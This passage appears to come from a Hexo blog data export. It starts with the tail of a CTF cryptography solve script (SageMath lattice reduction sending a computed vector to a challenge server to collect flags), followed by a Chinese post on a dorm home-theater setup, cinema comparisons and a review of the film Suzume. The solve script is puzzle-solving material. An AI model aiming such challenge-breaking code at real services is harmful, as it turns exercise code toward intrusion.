class=\"built_in\">list</span>(c))</span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> result])</span><br><span class=\"line\">flag1 = flag.split(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">success(<span class=\"string\">&#x27;flag1: &#x27;</span>+flag1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># V = (M - matrix.identity(128)).right_kernel().basis_matrix()</span></span><br><span class=\"line\"><span class=\"comment\"># v = V[0]</span></span><br><span class=\"line\"><span class=\"comment\"># print(v)</span></span><br><span class=\"line\"><span class=\"comment\"># v = bytes(v)</span></span><br><span class=\"line\"><span class=\"comment\"># v = hex(bytes_to_long(v))[2:].zfill(256)</span></span><br><span class=\"line\"><span class=\"comment\"># print(v,len(v))</span></span><br><span class=\"line\"><span class=\"comment\"># r.sendlineafter(b&#x27;&gt;&#x27;, v.encode())</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cvp</span>(<span class=\"params\">M, v, d=<span class=\"number\">2</span>**<span class=\"number\">10</span>, mothod=<span class=\"string\">&#x27;BKZ&#x27;</span></span>):</span><br><span class=\"line\">    p = M.base_ring().characteristic()</span><br><span class=\"line\">    M = M.change_ring(ZZ)</span><br><span class=\"line\">    v = v.change_ring(ZZ)</span><br><span class=\"line\">    M = M.stack(matrix.identity(M.ncols())*p)</span><br><span class=\"line\">    M = M.stack(-v)</span><br><span class=\"line\">    M = M.augment(vector(ZZ, [<span class=\"number\">0</span>]*(M.nrows()-<span class=\"number\">1</span>)+[d]))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> mothod == <span class=\"string\">&#x27;LLL&#x27;</span>:</span><br><span class=\"line\">        M = M.LLL()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        M = M.BKZ()</span><br><span class=\"line\">    vv = vector(ZZ, M[-<span class=\"number\">1</span>][:-<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> vv+v</span><br><span class=\"line\"></span><br><span class=\"line\">Z = (M - matrix.identity(<span class=\"number\">128</span>)).right_kernel().basis_matrix()</span><br><span class=\"line\">v = cvp(Z, vector(ZZ, [<span class=\"number\">0x50</span>]*<span class=\"number\">128</span>))</span><br><span class=\"line\">v = <span class=\"built_in\">hex</span>(bytes_to_long(<span class=\"built_in\">bytes</span>(<span class=\"built_in\">list</span>(v))))[<span class=\"number\">2</span>:].zfill(<span class=\"number\">256</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;&gt;&#x27;</span>, v.encode())</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;[+] unbelievable !!! You are an excellent hacker!\\n&#x27;</span>)</span><br><span class=\"line\">flag2 = r.readline().decode().strip()</span><br><span class=\"line\">success(<span class=\"string\">&#x27;flag2: &#x27;</span>+flag2)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;[+] how can you find such an exquisite solution?\\n&#x27;</span>)</span><br><span class=\"line\">flag3 = r.readline().decode().strip()</span><br><span class=\"line\">success(<span class=\"string\">&#x27;flag3: &#x27;</span>+flag3)</span><br><span class=\"line\"></span><br><span class=\"line\">r.close()</span><br></pre></td></tr></table></figure>"},{"title":"宿舍影院搭建 & 五刷《铃芽之旅》后的浅评","date":"2023-04-19T05:02:00.000Z","_content":"\n越来越不务正业乐！\n<!--more-->\n\n## 前言\n\n初三时基本将宫崎骏和新海诚的电影都看了一遍，比较喜欢日本动画的风格，这次的《铃芽之旅》终于是在电影院看了，为了对比不同影院的观影效果，特意去了五次，然后，就破产了。\n\n## 宿舍影院搭建\n\n之前用的显示屏是 16:9 27 英寸屏，但现在很多电影都是宽幕，在宿舍用投影仪也不现实 ~~（其实也不是完全不现实）~~，所以就买了一个 21:9 34 英寸的带鱼屏。因为对床开着灯会导致屏幕反光，就买了个桌帘挡着，效果就很好了。\n音响用的是漫步者的 R501BT，5.1声道，759RMB 入的，看到上一年双十一最低价有到 600，但本着早买早享受的原则，就不等了。\n桌子左边是衣柜，隔板会增强回音，导致声场不平衡，就买了块 50*50 的吸音棉，回音基本消了，还顺便起到吸光的效果。\n后面的两个音箱架高，可以感觉到天上的雨声。\n\n### 显示屏\n\n主要看分辨率、色深、色域、色准、防蓝光、亮度、对比度、刷新率、响应时间、HDR、曲率。\n\n* 分辨率\n这个其实没啥好讲的，越高越好，不追求带鱼屏的话直接 4K，比 1080P 和 2K(1440P) 清晰得多。\n\n* 色深\n色深会影响颜色过渡的平滑度，一般都是 8 位，很多 10 位也是 8 位抖出来的，原生 10 位价格很高，一般人也看不出来。\n\n* 色域\n这个比较复杂，慢慢完善。\n首先有个东西叫色彩马蹄图，表示人眼能分辨的全部色彩，然后显示屏的色域就是这个图的子集，一般呈三角形，常见的有 NTSC，sRGB，DCI-P3，BT.2020，一般广告宣传标的都是容积率，也就是产品色域面积是标准色域的多少，但是注意这个不是覆盖率，100% sRGB 色域容积不一定 100% 覆盖 sRGB 色域。识别方法也很简单，没标是覆盖率一律当作容积处理，超过 100% 的也必定不是覆盖率。\n\n* 色准\n看 $\\Delta$E，越小越好，一般 2 以内就可以了，但是这个参数一般是指出厂的**平均值**，具体在自己收到的机子是不一定，看自己运气，不过一般人看不出色偏。而且我发现我眼镜是防蓝光的，戴上看屏幕色温明显升高，有空还是去配个普通镜片吧。\n至于校色，一般没必要，几百的红蜘蛛测普通屏幕也测不准，正经校色都要十万往上的设备。\n\n* 防蓝光\n优先**硬件级**防蓝光，没写就是软件级。\n\n* 亮度\n这个高当然好，但比较看个人需求。我这个显示屏是 350 nit，宿舍里没有阳光直射，开 70% 都绰绰有余。\n\n* 对比度\n就是最白和最黑时亮度的比值，一般 VA 屏的对比度要高点，如果不打游戏就直接 VA 屏，对比度会比较高，4000:1 以上比较好了。主要还是看**原生对比度**，所谓动态对比度就是通过调整背光亮度来实现的，我直接关掉背光，那动态对比度就是无穷大了，参考价值不大。\n\n* 刷新率\n这个有点曾经沧海难为水的，如果用过了高刷就回不来了，就算不打游戏，窗口的最大最小化也能看出来高刷很自然而低刷有明显卡顿。如果是办公的话 144 Hz 就行了，再往上也体现不出来。\n\n* 响应时间\n游戏方面比较需要这个，办公的话就不用太在意。一般选 IPS 屏响应时间会好点，但是 IPS 屏一般漏光会比较严重，意思就是就算放一张全黑的图片显示屏的边缘也会有光，这个是 LED 屏的通病，要么买会烧屏的 OLED，富哥可以考虑 Micro LED。\n\n* HDR\nHDR10 基本没啥效果的，折腾不好搞成负优化了还不如 SDR，建议不要管。\n\n* 曲率\n一般大屏曲一点是好的，有环绕感，边上也不会太远产生虚焦。不信你去影院看，银幕也是弧面的。\n\n### 投影仪\n\n虽然现在的体验已经相当不错了，但是谁能拒绝巨幕呢？\n\n* 光源\n传统光源是灯炮，然后是 LED，然后是激光光源。\n推荐三色激光，色彩、对比度、亮度都能打，某品牌的 LED 还在吹，不要上当。\n目前的三色激光只有散斑和色散的问题，但是从我个人体验来说，选择最优的解决方案后，观影的时候是完全感觉不出来的，完全没有某品牌黑到不能用的程度。\n光峰的 ALPD5.0 年底应该能出新机，说是能解决散斑和色散的问题，这样三色就是完美技术了，期待一手。\n\n* 显像芯片\nDMD，LCOS，LCD。\n\n### 音响\n\n2.1 就是左右音箱加一个低音炮，5.1 就是左右音箱加一个中置音箱加一个低音炮加两个环绕音箱，7.1 不是富哥又没需求的话不建议买，因为音源也少，用不着。\n如果会产生驻波可以考虑加低频陷阱或者用双炮，当然你如果像我一样也在宿舍用就别花那个劲做声学处理了。\n\n## 影院对比\n\n1. 数字 IMAX\n头两次都是在金逸影城（深圳光明区大仟里店）看的，基本只顾着看剧情了，所以观影效果基本忘了。第三次在 CINESKY 新天影院（深圳龙华区壹方天地店），只记录这个。\n体验：第一反应就是银幕很大（但是走近看也不会明显看到像素点，如果《铃芽之旅》是 4K 片源的话那我觉得现在 8K 电视完全就是没必要了），工作人员服务也好，指引招呼都很热情，里面的声学设计也很不错，吸音棉沟壑多，错落有致，保持美观的同时总体声场很好。唯一缺点：票有点贵。\n2. 二代 IMAX\n影院：万达影院（深圳龙岗万达广场 IMAX 激光店）\n体验：去的是早上 10 点的场，检票员都还没来上班，理论上可以随便进，进到里面也没人，算是我包场了，乐。银幕较小，亮度与数字 IMAX 相比看不出有明显区别，12.0 声道，但是天空声道听不出声音，基本可以判断《铃芽之旅》是 5.0 声道片源。\n3. 杜比影院\n影院：万象影城（深圳罗湖万象城店）\n体验：首先这是我第一次去万象城，对我这种乡巴佬来说非常不适应，全是卖奢侈品的，几乎所有店名都是英文，一家吃的也没，最后实在赶时间，花 38 买了一桶爆米花，纯纯大冤种。影院排场过密，开场前 10 分钟才给进。杜比视界的对比度确实高，黑的地方很黑，银幕边缘基本不会像 IMAX 厅有类似显示屏漏光的现象，亮度对比 IMAX 也稍有提高。但是影院似乎把音量调小了，《铃芽之旅》关门的情节中，上锁的声音最后会有一声极为高频的清鸣，在 IMAX 厅感觉非常明显，但在这个厅没有，给人的感觉就没那么燃，隔音也没做好，时不时会传来隔壁影院的低音振动。此外，我坐的位置观影时能看到左右两边有非常亮的安全出口绿光，十分影响观影体验，如果能往前坐一排的话应该不会有这个问题。\n\n总结：2D 电影基本都可以在数字 IMAX 厅或杜比影院看，激光 IMAX 应该只有在 3D 电影才会体现出亮度优势。\n\n## 浅评《铃芽之旅》\n\n第一次比较认真地鉴赏电影，感觉还是挺有意思的。\n期间也看了很多关于《铃芽之旅》的评论，很多都是不加思考的主观臆断，并不是说电影没有问题，每个人都可以有其对作品的理解和看法，但没有依据地一味批评显得十分无脑，只能说可能是短视频刷多了，遇到需要思考的东西就回避，直接贴上一个“逻辑混乱”的标签掩饰自己的懒惰。在我看来，电影和阅读理解一样，很难说一遍就能读透的，赏析时也不能光写观点而不给理由。\n首先**我觉得最不合适的就是分类在爱情片里**，《铃芽之旅》的爱情线虽然勉强算是完整，但着笔确实太少，只能说能圆上，其中最大的问题在于对草太的人物刻画十分单薄，两人的独处篇幅也少。\n其次这个电影**并不是逻辑混乱的**，当然也不能说逻辑十分完整。第一遍看的时候我也很懵，但后来越看越合理，许多情节都是伏笔。\n这里给出几个我的观点，仅供参考。\n\n* 铃芽真的是恋爱脑吗？\n首先我们要知道一个设定，那就是铃芽的母亲是在 311 地震中丧生的，这带给铃芽很大的打击，电影开头里，铃芽梦见她小时候在常世找妈妈，表明**铃芽对母亲的逝去始终无法释怀**。\n我认为铃芽一开始带草太回家一方面是因为她跟随母亲当护士的职业操守，一方面自然是好奇。铃芽跟着草太和大臣一起上船也不难理解，椅子是她妈妈留下的遗物，总不能不管吧。\n\n* 黄蝴蝶的含义是什么？\n我比较赞同**黄蝴蝶是铃芽母亲**的说法。如果说前面只是普通的暗示，那么电影结尾铃芽看着小时候的自己，哭着说“妈妈，我该怎么办”时，黄蝴蝶围着椅子飞，给她指明方向时，就是新海诚明着说这就是铃芽妈妈了。\n\n* 东京的要石是被谁拔出的？\n我的猜测是**大臣**拔出的，作案动机我也不能十分揣测明白，但是作案时间是具备的，大臣消失了一会蚓厄就爆发了。\n\n其他的小细节：\n\n* 三部曲都有人抽烟，《你的名字》是奥寺，《天气之子》是大叔，《铃芽之旅》是芹泽。\n* 游乐场的往门能进去。\n* 千果为了搭铃芽去废弃的学校，橙子都没带上车。\n* 铃芽房间里的《看护师》给了两次镜头，第一次是草太到房间里的时候，第二次是结尾，表明铃芽也继承了母亲的职业。\n* 草太坠落时的背景是燃烧的常世。\n","source":"_posts/宿舍影院搭建 & 五刷《铃芽之旅》后的浅评.md","raw":"---\ntitle: 宿舍影院搭建 & 五刷《铃芽之旅》后的浅评\ndate: 2023-04-19 13:02:00\ntags: [电影, 生活]\ncategories: 生活\n---\n\n越来越不务正业乐！\n<!--more-->\n\n## 前言\n\n初三时基本将宫崎骏和新海诚的电影都看了一遍，比较喜欢日本动画的风格，这次的《铃芽之旅》终于是在电影院看了，为了对比不同影院的观影效果，特意去了五次，然后，就破产了。\n\n## 宿舍影院搭建\n\n之前用的显示屏是 16:9 27 英寸屏，但现在很多电影都是宽幕，在宿舍用投影仪也不现实 ~~（其实也不是完全不现实）~~，所以就买了一个 21:9 34 英寸的带鱼屏。因为对床开着灯会导致屏幕反光，就买了个桌帘挡着，效果就很好了。\n音响用的是漫步者的 R501BT，5.1声道，759RMB 入的，看到上一年双十一最低价有到 600，但本着早买早享受的原则，就不等了。\n桌子左边是衣柜，隔板会增强回音，导致声场不平衡，就买了块 50*50 的吸音棉，回音基本消了，还顺便起到吸光的效果。\n后面的两个音箱架高，可以感觉到天上的雨声。\n\n### 显示屏\n\n主要看分辨率、色深、色域、色准、防蓝光、亮度、对比度、刷新率、响应时间、HDR、曲率。\n\n* 分辨率\n这个其实没啥好讲的，越高越好，不追求带鱼屏的话直接 4K，比 1080P 和 2K(1440P) 清晰得多。\n\n* 色深\n色深会影响颜色过渡的平滑度，一般都是 8 位，很多 10 位也是 8 位抖出来的，原生 10 位价格很高，一般人也看不出来。\n\n* 色域\n这个比较复杂，慢慢完善。\n首先有个东西叫色彩马蹄图，表示人眼能分辨的全部色彩，然后显示屏的色域就是这个图的子集，一般呈三角形，常见的有 NTSC，sRGB，DCI-P3，BT.2020，一般广告宣传标的都是容积率，也就是产品色域面积是标准色域的多少，但是注意这个不是覆盖率，100% sRGB 色域容积不一定 100% 覆盖 sRGB 色域。识别方法也很简单，没标是覆盖率一律当作容积处理，超过 100% 的也必定不是覆盖率。\n\n* 色准\n看 $\\Delta$E，越小越好，一般 2 以内就可以了，但是这个参数一般是指出厂的**平均值**，具体在自己收到的机子是不一定，看自己运气，不过一般人看不出色偏。而且我发现我眼镜是防蓝光的，戴上看屏幕色温明显升高，有空还是去配个普通镜片吧。\n至于校色，一般没必要，几百的红蜘蛛测普通屏幕也测不准，正经校色都要十万往上的设备。\n\n* 防蓝光\n优先**硬件级**防蓝光，没写就是软件级。\n\n* 亮度\n这个高当然好，但比较看个人需求。我这个显示屏是 350 nit，宿舍里没有阳光直射，开 70% 都绰绰有余。\n\n* 对比度\n就是最白和最黑时亮度的比值，一般 VA 屏的对比度要高点，如果不打游戏就直接 VA 屏，对比度会比较高，4000:1 以上比较好了。主要还是看**原生对比度**，所谓动态对比度就是通过调整背光亮度来实现的，我直接关掉背光，那动态对比度就是无穷大了，参考价值不大。\n\n* 刷新率\n这个有点曾经沧海难为水的，如果用过了高刷就回不来了，就算不打游戏，窗口的最大最小化也能看出来高刷很自然而低刷有明显卡顿。如果是办公的话 144 Hz 就行了，再往上也体现不出来。\n\n* 响应时间\n游戏方面比较需要这个，办公的话就不用太在意。一般选 IPS 屏响应时间会好点，但是 IPS 屏一般漏光会比较严重，意思就是就算放一张全黑的图片显示屏的边缘也会有光，这个是 LED 屏的通病，要么买会烧屏的 OLED，富哥可以考虑 Micro LED。\n\n* HDR\nHDR10 基本没啥效果的，折腾不好搞成负优化了还不如 SDR，建议不要管。\n\n* 曲率\n一般大屏曲一点是好的，有环绕感，边上也不会太远产生虚焦。不信你去影院看，银幕也是弧面的。\n\n### 投影仪\n\n虽然现在的体验已经相当不错了，但是谁能拒绝巨幕呢？\n\n* 光源\n传统光源是灯炮，然后是 LED，然后是激光光源。\n推荐三色激光，色彩、对比度、亮度都能打，某品牌的 LED 还在吹，不要上当。\n目前的三色激光只有散斑和色散的问题，但是从我个人体验来说，选择最优的解决方案后，观影的时候是完全感觉不出来的，完全没有某品牌黑到不能用的程度。\n光峰的 ALPD5.0 年底应该能出新机，说是能解决散斑和色散的问题，这样三色就是完美技术了，期待一手。\n\n* 显像芯片\nDMD，LCOS，LCD。\n\n### 音响\n\n2.1 就是左右音箱加一个低音炮，5.1 就是左右音箱加一个中置音箱加一个低音炮加两个环绕音箱，7.1 不是富哥又没需求的话不建议买，因为音源也少，用不着。\n如果会产生驻波可以考虑加低频陷阱或者用双炮，当然你如果像我一样也在宿舍用就别花那个劲做声学处理了。\n\n## 影院对比\n\n1. 数字 IMAX\n头两次都是在金逸影城（深圳光明区大仟里店）看的，基本只顾着看剧情了，所以观影效果基本忘了。第三次在 CINESKY 新天影院（深圳龙华区壹方天地店），只记录这个。\n体验：第一反应就是银幕很大（但是走近看也不会明显看到像素点，如果《铃芽之旅》是 4K 片源的话那我觉得现在 8K 电视完全就是没必要了），工作人员服务也好，指引招呼都很热情，里面的声学设计也很不错，吸音棉沟壑多，错落有致，保持美观的同时总体声场很好。唯一缺点：票有点贵。\n2. 二代 IMAX\n影院：万达影院（深圳龙岗万达广场 IMAX 激光店）\n体验：去的是早上 10 点的场，检票员都还没来上班，理论上可以随便进，进到里面也没人，算是我包场了，乐。银幕较小，亮度与数字 IMAX 相比看不出有明显区别，12.0 声道，但是天空声道听不出声音，基本可以判断《铃芽之旅》是 5.0 声道片源。\n3. 杜比影院\n影院：万象影城（深圳罗湖万象城店）\n体验：首先这是我第一次去万象城，对我这种乡巴佬来说非常不适应，全是卖奢侈品的，几乎所有店名都是英文，一家吃的也没，最后实在赶时间，花 38 买了一桶爆米花，纯纯大冤种。影院排场过密，开场前 10 分钟才给进。杜比视界的对比度确实高，黑的地方很黑，银幕边缘基本不会像 IMAX 厅有类似显示屏漏光的现象，亮度对比 IMAX 也稍有提高。但是影院似乎把音量调小了，《铃芽之旅》关门的情节中，上锁的声音最后会有一声极为高频的清鸣，在 IMAX 厅感觉非常明显，但在这个厅没有，给人的感觉就没那么燃，隔音也没做好，时不时会传来隔壁影院的低音振动。此外，我坐的位置观影时能看到左右两边有非常亮的安全出口绿光，十分影响观影体验，如果能往前坐一排的话应该不会有这个问题。\n\n总结：2D 电影基本都可以在数字 IMAX 厅或杜比影院看，激光 IMAX 应该只有在 3D 电影才会体现出亮度优势。\n\n## 浅评《铃芽之旅》\n\n第一次比较认真地鉴赏电影，感觉还是挺有意思的。\n期间也看了很多关于《铃芽之旅》的评论，很多都是不加思考的主观臆断，并不是说电影没有问题，每个人都可以有其对作品的理解和看法，但没有依据地一味批评显得十分无脑，只能说可能是短视频刷多了，遇到需要思考的东西就回避，直接贴上一个“逻辑混乱”的标签掩饰自己的懒惰。在我看来，电影和阅读理解一样，很难说一遍就能读透的，赏析时也不能光写观点而不给理由。\n首先**我觉得最不合适的就是分类在爱情片里**，《铃芽之旅》的爱情线虽然勉强算是完整，但着笔确实太少，只能说能圆上，其中最大的问题在于对草太的人物刻画十分单薄，两人的独处篇幅也少。\n其次这个电影**并不是逻辑混乱的**，当然也不能说逻辑十分完整。第一遍看的时候我也很懵，但后来越看越合理，许多情节都是伏笔。\n这里给出几个我的观点，仅供参考。\n\n* 铃芽真的是恋爱脑吗？\n首先我们要知道一个设定，那就是铃芽的母亲是在 311 地震中丧生的，这带给铃芽很大的打击，电影开头里，铃芽梦见她小时候在常世找妈妈，表明**铃芽对母亲的逝去始终无法释怀**。\n我认为铃芽一开始带草太回家一方面是因为她跟随母亲当护士的职业操守，一方面自然是好奇。铃芽跟着草太和大臣一起上船也不难理解，椅子是她妈妈留下的遗物，总不能不管吧。\n\n* 黄蝴蝶的含义是什么？\n我比较赞同**黄蝴蝶是铃芽母亲**的说法。如果说前面只是普通的暗示，那么电影结尾铃芽看着小时候的自己，哭着说“妈妈，我该怎么办”时，黄蝴蝶围着椅子飞，给她指明方向时，就是新海诚明着说这就是铃芽妈妈了。\n\n* 东京的要石是被谁拔出的？\n我的猜测是**大臣**拔出的，作案动机我也不能十分揣测明白，但是作案时间是具备的，大臣消失了一会蚓厄就爆发了。\n\n其他的小细节：\n\n* 三部曲都有人抽烟，《你的名字》是奥寺，《天气之子》是大叔，《铃芽之旅》是芹泽。\n* 游乐场的往门能进去。\n* 千果为了搭铃芽去废弃的学校，橙子都没带上车。\n* 铃芽房间里的《看护师》给了两次镜头，第一次是草太到房间里的时候，第二次是结尾，表明铃芽也继承了母亲的职业。\n* 草太坠落时的背景是燃烧的常世。\n","slug":"宿舍影院搭建 & 五刷《铃芽之旅》后的浅评","published":1,"updated":"2023-06-20T18:54:14.781Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zodq001j7slz3bnx3d0f","content":"<p>越来越不务正业乐！</p>\n<span id=\"more\"></span>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>初三时基本将宫崎骏和新海诚的电影都看了一遍，比较喜欢日本动画的风格，这次的《铃芽之旅》终于是在电影院看了，为了对比不同影院的观影效果，特意去了五次，然后，就破产了。</p>\n<h2 id=\"宿舍影院搭建\"><a href=\"#宿舍影院搭建\" class=\"headerlink\" title=\"宿舍影院搭建\"></a>宿舍影院搭建</h2><p>之前用的显示屏是 16:9 27 英寸屏，但现在很多电影都是宽幕，在宿舍用投影仪也不现实 <del>（其实也不是完全不现实）</del>，所以就买了一个 21:9 34 英寸的带鱼屏。因为对床开着灯会导致屏幕反光，就买了个桌帘挡着，效果就很好了。<br>音响用的是漫步者的 R501BT，5.1声道，759RMB 入的，看到上一年双十一最低价有到 600，但本着早买早享受的原则，就不等了。<br>桌子左边是衣柜，隔板会增强回音，导致声场不平衡，就买了块 50*50 的吸音棉，回音基本消了，还顺便起到吸光的效果。<br>后面的两个音箱架高，可以感觉到天上的雨声。</p>\n<h3 id=\"显示屏\"><a href=\"#显示屏\" class=\"headerlink\" title=\"显示屏\"></a>显示屏</h3><p>主要看分辨率、色深、色域、色准、防蓝光、亮度、对比度、刷新率、响应时间、HDR、曲率。</p>\n<ul>\n<li><p>分辨率<br>这个其实没啥好讲的，越高越好，不追求带鱼屏的话直接 4K，比 1080P 和 2K(1440P) 清晰得多。</p>\n</li>\n<li><p>色深<br>色深会影响颜色过渡的平滑度，一般都是 8 位，很多 10 位也是 8 位抖出来的，原生 10 位价格很高，一般人也看不出来。</p>\n</li>\n<li><p>色域<br>这个比较复杂，慢慢完善。<br>首先有个东西叫色彩马蹄图，表示人眼能分辨的全部色彩，然后显示屏的色域就是这个图的子集，一般呈三角形，常见的有 NTSC，sRGB，DCI-P3，BT.2020，一般广告宣传标的都是容积率，也就是产品色域面积是标准色域的多少，但是注意这个不是覆盖率，100% sRGB 色域容积不一定 100% 覆盖 sRGB 色域。识别方法也很简单，没标是覆盖率一律当作容积处理，超过 100% 的也必定不是覆盖率。</p>\n</li>\n<li><p>色准<br>看 $\\Delta$E，越小越好，一般 2 以内就可以了，但是这个参数一般是指出厂的<strong>平均值</strong>，具体在自己收到的机子是不一定，看自己运气，不过一般人看不出色偏。而且我发现我眼镜是防蓝光的，戴上看屏幕色温明显升高，有空还是去配个普通镜片吧。<br>至于校色，一般没必要，几百的红蜘蛛测普通屏幕也测不准，正经校色都要十万往上的设备。</p>\n</li>\n<li><p>防蓝光<br>优先<strong>硬件级</strong>防蓝光，没写就是软件级。</p>\n</li>\n<li><p>亮度<br>这个高当然好，但比较看个人需求。我这个显示屏是 350 nit，宿舍里没有阳光直射，开 70% 都绰绰有余。</p>\n</li>\n<li><p>对比度<br>就是最白和最黑时亮度的比值，一般 VA 屏的对比度要高点，如果不打游戏就直接 VA 屏，对比度会比较高，4000:1 以上比较好了。主要还是看<strong>原生对比度</strong>，所谓动态对比度就是通过调整背光亮度来实现的，我直接关掉背光，那动态对比度就是无穷大了，参考价值不大。</p>\n</li>\n<li><p>刷新率<br>这个有点曾经沧海难为水的，如果用过了高刷就回不来了，就算不打游戏，窗口的最大最小化也能看出来高刷很自然而低刷有明显卡顿。如果是办公的话 144 Hz 就行了，再往上也体现不出来。</p>\n</li>\n<li><p>响应时间<br>游戏方面比较需要这个，办公的话就不用太在意。一般选 IPS 屏响应时间会好点，但是 IPS 屏一般漏光会比较严重，意思就是就算放一张全黑的图片显示屏的边缘也会有光，这个是 LED 屏的通病，要么买会烧屏的 OLED，富哥可以考虑 Micro LED。</p>\n</li>\n<li><p>HDR<br>HDR10 基本没啥效果的，折腾不好搞成负优化了还不如 SDR，建议不要管。</p>\n</li>\n<li><p>曲率<br>一般大屏曲一点是好的，有环绕感，边上也不会太远产生虚焦。不信你去影院看，银幕也是弧面的。</p>\n</li>\n</ul>\n<h3 id=\"投影仪\"><a href=\"#投影仪\" class=\"headerlink\" title=\"投影仪\"></a>投影仪</h3><p>虽然现在的体验已经相当不错了，但是谁能拒绝巨幕呢？</p>\n<ul>\n<li><p>光源<br>传统光源是灯炮，然后是 LED，然后是激光光源。<br>推荐三色激光，色彩、对比度、亮度都能打，某品牌的 LED 还在吹，不要上当。<br>目前的三色激光只有散斑和色散的问题，但是从我个人体验来说，选择最优的解决方案后，观影的时候是完全感觉不出来的，完全没有某品牌黑到不能用的程度。<br>光峰的 ALPD5.0 年底应该能出新机，说是能解决散斑和色散的问题，这样三色就是完美技术了，期待一手。</p>\n</li>\n<li><p>显像芯片<br>DMD，LCOS，LCD。</p>\n</li>\n</ul>\n<h3 id=\"音响\"><a href=\"#音响\" class=\"headerlink\" title=\"音响\"></a>音响</h3><p>2.1 就是左右音箱加一个低音炮，5.1 就是左右音箱加一个中置音箱加一个低音炮加两个环绕音箱，7.1 不是富哥又没需求的话不建议买，因为音源也少，用不着。<br>如果会产生驻波可以考虑加低频陷阱或者用双炮，当然你如果像我一样也在宿舍用就别花那个劲做声学处理了。</p>\n<h2 id=\"影院对比\"><a href=\"#影院对比\" class=\"headerlink\" title=\"影院对比\"></a>影院对比</h2><ol>\n<li>数字 IMAX<br>头两次都是在金逸影城（深圳光明区大仟里店）看的，基本只顾着看剧情了，所以观影效果基本忘了。第三次在 CINESKY 新天影院（深圳龙华区壹方天地店），只记录这个。<br>体验：第一反应就是银幕很大（但是走近看也不会明显看到像素点，如果《铃芽之旅》是 4K 片源的话那我觉得现在 8K 电视完全就是没必要了），工作人员服务也好，指引招呼都很热情，里面的声学设计也很不错，吸音棉沟壑多，错落有致，保持美观的同时总体声场很好。唯一缺点：票有点贵。</li>\n<li>二代 IMAX<br>影院：万达影院（深圳龙岗万达广场 IMAX 激光店）<br>体验：去的是早上 10 点的场，检票员都还没来上班，理论上可以随便进，进到里面也没人，算是我包场了，乐。银幕较小，亮度与数字 IMAX 相比看不出有明显区别，12.0 声道，但是天空声道听不出声音，基本可以判断《铃芽之旅》是 5.0 声道片源。</li>\n<li>杜比影院<br>影院：万象影城（深圳罗湖万象城店）<br>体验：首先这是我第一次去万象城，对我这种乡巴佬来说非常不适应，全是卖奢侈品的，几乎所有店名都是英文，一家吃的也没，最后实在赶时间，花 38 买了一桶爆米花，纯纯大冤种。影院排场过密，开场前 10 分钟才给进。杜比视界的对比度确实高，黑的地方很黑，银幕边缘基本不会像 IMAX 厅有类似显示屏漏光的现象，亮度对比 IMAX 也稍有提高。但是影院似乎把音量调小了，《铃芽之旅》关门的情节中，上锁的声音最后会有一声极为高频的清鸣，在 IMAX 厅感觉非常明显，但在这个厅没有，给人的感觉就没那么燃，隔音也没做好，时不时会传来隔壁影院的低音振动。此外，我坐的位置观影时能看到左右两边有非常亮的安全出口绿光，十分影响观影体验，如果能往前坐一排的话应该不会有这个问题。</li>\n</ol>\n<p>总结：2D 电影基本都可以在数字 IMAX 厅或杜比影院看，激光 IMAX 应该只有在 3D 电影才会体现出亮度优势。</p>\n<h2 id=\"浅评《铃芽之旅》\"><a href=\"#浅评《铃芽之旅》\" class=\"headerlink\" title=\"浅评《铃芽之旅》\"></a>浅评《铃芽之旅》</h2><p>第一次比较认真地鉴赏电影，感觉还是挺有意思的。<br>期间也看了很多关于《铃芽之旅》的评论，很多都是不加思考的主观臆断，并不是说电影没有问题，每个人都可以有其对作品的理解和看法，但没有依据地一味批评显得十分无脑，只能说可能是短视频刷多了，遇到需要思考的东西就回避，直接贴上一个“逻辑混乱”的标签掩饰自己的懒惰。在我看来，电影和阅读理解一样，很难说一遍就能读透的，赏析时也不能光写观点而不给理由。<br>首先<strong>我觉得最不合适的就是分类在爱情片里</strong>，《铃芽之旅》的爱情线虽然勉强算是完整，但着笔确实太少，只能说能圆上，其中最大的问题在于对草太的人物刻画十分单薄，两人的独处篇幅也少。<br>其次这个电影<strong>并不是逻辑混乱的</strong>，当然也不能说逻辑十分完整。第一遍看的时候我也很懵，但后来越看越合理，许多情节都是伏笔。<br>这里给出几个我的观点，仅供参考。</p>\n<ul>\n<li><p>铃芽真的是恋爱脑吗？<br>首先我们要知道一个设定，那就是铃芽的母亲是在 311 地震中丧生的，这带给铃芽很大的打击，电影开头里，铃芽梦见她小时候在常世找妈妈，表明<strong>铃芽对母亲的逝去始终无法释怀</strong>。<br>我认为铃芽一开始带草太回家一方面是因为她跟随母亲当护士的职业操守，一方面自然是好奇。铃芽跟着草太和大臣一起上船也不难理解，椅子是她妈妈留下的遗物，总不能不管吧。</p>\n</li>\n<li><p>黄蝴蝶的含义是什么？<br>我比较赞同<strong>黄蝴蝶是铃芽母亲</strong>的说法。如果说前面只是普通的暗示，那么电影结尾铃芽看着小时候的自己，哭着说“妈妈，我该怎么办”时，黄蝴蝶围着椅子飞，给她指明方向时，就是新海诚明着说这就是铃芽妈妈了。</p>\n</li>\n<li><p>东京的要石是被谁拔出的？<br>我的猜测是<strong>大臣</strong>拔出的，作案动机我也不能十分揣测明白，但是作案时间是具备的，大臣消失了一会蚓厄就爆发了。</p>\n</li>\n</ul>\n<p>其他的小细节：</p>\n<ul>\n<li>三部曲都有人抽烟，《你的名字》是奥寺，《天气之子》是大叔，《铃芽之旅》是芹泽。</li>\n<li>游乐场的往门能进去。</li>\n<li>千果为了搭铃芽去废弃的学校，橙子都没